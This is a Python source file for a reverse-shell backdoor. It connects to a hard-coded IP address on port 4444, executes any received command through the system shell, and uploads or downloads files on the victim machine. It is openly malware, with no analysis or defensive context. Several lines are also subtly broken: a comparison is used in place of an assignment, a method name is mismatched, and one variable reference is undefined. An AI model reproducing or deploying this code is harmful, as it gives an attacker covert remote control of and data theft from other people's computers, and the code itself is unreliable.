
import socket, subprocess, json, os, base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exe_sys_cmd(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except Exception:
            return  " some error "

    def change_dir(self, path):
        os.chdir(path)
        return "[+] changing working dir .... to -->>" + path + "\n changed dir to " + path

    def writefile(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] upload success"

    def readfile(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            try:
                try:
                    command = self.reliable_receive()
                    if command[0] == "exit":
                        self.connection.close()
                        exit()
                    elif command[0] == "cd" and len(command) > 1:
                        command_result = self.change_dir(command[1])
                    elif command[0] == "download":
                        command_result == self.read_file(command[1])
                    elif command[0] == "upload":
                        command_result = self.writefile(command[1], command[2])
                    elif command[0] == "":
                        command_result == " give correct command"
                    else:
                        command_result = self.exe_sys_cmd(command)
                    self.reliable_send(command_result)
                except WindowsError:
                    command_result = "cmd error"
                    self.reliable_send(command_result)
            except KeyboardInterrupt:
                connection.close


ip = "192.168.1.112"

my_backdoor = Backdoor(ip, 4444)
my_backdoor.run()
